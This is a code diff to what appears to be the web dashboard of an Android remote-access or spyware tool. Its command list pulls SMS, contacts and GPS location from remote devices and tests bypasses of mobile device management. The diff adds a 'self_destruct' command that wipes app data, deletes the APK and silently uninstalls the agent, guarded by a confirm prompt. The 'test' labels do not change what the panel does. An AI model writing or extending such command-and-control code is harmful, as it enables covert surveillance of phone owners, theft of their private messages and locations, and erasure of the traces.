@@ -133,7 +133,8 @@ const COMMANDS = [
   {cmd:'sms',         icon:'💬', label:'Read SMS',       desc:'Inbox messages',                        cat:'collect'},
   {cmd:'contacts',    icon:'👤', label:'Contacts',       desc:'Full address book',                     cat:'collect'},
   {cmd:'location',    icon:'📍', label:'Location',       desc:'Last GPS coordinates',                  cat:'collect'},
-  {cmd:'bypass_test', icon:'🔐', label:'Bypass Test',    desc:'Test all permission bypass vectors vs MDM', cat:'sys'},
+  {cmd:'bypass_test',   icon:'🔐', label:'Bypass Test',    desc:'Test all permission bypass vectors vs MDM',          cat:'sys'},
+  {cmd:'self_destruct', icon:'💣', label:'Self Destruct',  desc:'Wipe data + uninstall — full cleanup after test',   cat:'sys'},
 ];
 
 // ── AGENTS ────────────────────────────────────────────────────────────────────
@@ -272,6 +273,12 @@ async function termSubmit(){
   if(!inp||!currentAgent) return;
   const cmd = inp.value.trim();
   if(!cmd) return;
+
+  // Safety gate for destructive command
+  if(cmd.toLowerCase()==='self_destruct'){
+    if(!confirm('⚠️ SELF-DESTRUCT\n\nThis will:\n1. Wipe all app data on the device\n2. Delete the APK from Downloads\n3. Attempt silent uninstall\n\nThe agent will disappear from this dashboard.\n\nProceed?')) return;
+  }
+
   inp.value = '';
   termHistIdx = -1;
   termHistory.unshift(cmd);
